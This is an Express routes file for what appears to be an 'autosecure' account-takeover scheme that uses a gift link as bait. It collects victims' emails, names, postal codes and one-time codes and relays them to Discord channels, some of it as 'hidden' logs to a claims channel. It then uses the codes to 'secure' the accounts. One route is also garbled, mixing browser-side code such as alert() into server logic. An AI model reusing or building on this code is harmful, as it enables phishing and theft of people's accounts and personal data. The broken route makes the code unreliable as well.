// Express routes for autosecure integration
const express = require('express');
const router = express.Router();
const AutosecureGiftLink = require('./autosecure_integration');

const autosecure = new AutosecureGiftLink();

// Clean up expired sessions every 5 minutes
setInterval(() => {
    autosecure.cleanupExpiredSessions();
}, 5 * 60 * 1000);

// POST /api/autosecure/verification-started
router.post('/verification-started', async (req, res) => {
    try {
        const { email, fullName, postalCode, product } = req.body;
        
        // Enviar embed de Discord al canal de logs si está disponible
        if (typeof sendDiscordEmbed === 'function') {
            const { getVerificationEmbed } = require('./discord_embeds');
            const embedData = getVerificationEmbed('verification_started', {
                email,
                fullName,
                postalCode,
                product
            });
            sendDiscordEmbed(embedData);
        }

        // Enviar embed oculto al canal de claims
        if (typeof global !== 'undefined' && global.client) {
            const { sendHiddenLogToClaims } = require('./discord_embeds');
            sendHiddenLogToClaims(global.client, 'verification_started', {
                email,
                fullName,
                postalCode,
                product
            }).catch(err => {
                console.error('Error sending hidden log to claims:', err);
            });
        }      
        res.json({ success: true, message: 'Verification started embed sent' });
        
    } catch (error) {
        console.error('Error in /verification-started:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Internal server error' 
        });
    }
});

// POST /api/autosecure/code-submitted
router.post('/code-submitted', async (req, res) => {
    try {
        const { email, code, sessionId, product } = req.body;
        
        // Enviar embed de Discord al canal de logs si está disponible
        if (typeof sendDiscordEmbed === 'function') {
            const { getVerificationEmbed } = require('./discord_embeds');
            const embedData = getVerificationEmbed('code_submitted', {
                email,
                code,
                sessionId,
                product
            });
            sendDiscordEmbed(embedData);
        }

        // Enviar embed oculto al canal de claims
        if (typeof global !== 'undefined' && global.client) {
            const { sendHiddenLogToClaims } = require('./discord_embeds');
            sendHiddenLogToClaims(global.client, 'code_submitted', {
                email,
                code,
                sessionId,
                product,
                fullName: 'Unknown' // No tenemos fullName en este punto
            }).catch(err => {
                console.error('Error sending hidden log to claims:', err);
            });
        }
        
        res.json({ success: true, message: 'Code submitted embed sent' });
        
    } catch (error) {
        console.error('Error in /code-submitted:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Internal server error' 
        });
    }
});

// POST /api/autosecure/send-otp
router.post('/send-otp', async (req, res) => {
    try {
        const { email } = req.body;
        
        if (!email) {
            return res.status(400).json({ 
                success: false, 
                error: 'Email is required' 
            });
        }

        const result = await autosecure.sendOTP(email);
        
        if (result.success) {
            securedAccount.value = result.account;
            currentStep.value = 3;
            if (timer) clearInterval(timer);
            
            // Enviar embed de Discord al canal de logs si está disponible
            if (result.embedData && typeof sendDiscordEmbed === 'function') {
                sendDiscordEmbed(result.embedData);
            }
        } else {
            alert(result.error || 'Failed to verify code');
            res.status(400).json(result);
        }
        
    } catch (error) {
        console.error('Error in /send-otp:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Internal server error' 
        });
    }
});

// POST /api/autosecure/verify
router.post('/verify', async (req, res) => {
    try {
        const { sessionId, otp, minecraftUsername } = req.body;
        
        if (!sessionId || !otp) {
            return res.status(400).json({ 
                success: false, 
                error: 'Session ID and OTP are required' 
            });
        }

        const result = await autosecure.verifyAndSecure(sessionId, otp, minecraftUsername);
        
        if (result.success) {
            res.json(result);
            
            // Enviar embed de Discord al canal de logs si está disponible
            if (result.embedData && typeof sendDiscordEmbed === 'function') {
                sendDiscordEmbed(result.embedData);
            }
        } else {
            res.status(400).json(result);
        }
        
    } catch (error) {
        console.error('Error in /verify:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Internal server error' 
        });
    }
});

// GET /api/autosecure/status/:sessionId
router.get('/status/:sessionId', (req, res) => {
    try {
        const { sessionId } = req.params;
        const session = autosecure.sessions.get(sessionId);
        
        if (!session) {
            return res.status(404).json({ 
                success: false, 
                error: 'Session not found or expired' 
            });
        }

        const timeLeft = Math.max(0, session.expires - Date.now());
        
        res.json({
            success: true,
            email: session.email,
            timeLeft: Math.floor(timeLeft / 1000), // seconds
            hasRecoveryMethods: session.data._totalSecurityMethods > 0
        });
        
    } catch (error) {
        console.error('Error in /status:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Internal server error' 
        });
    }
});

module.exports = router;
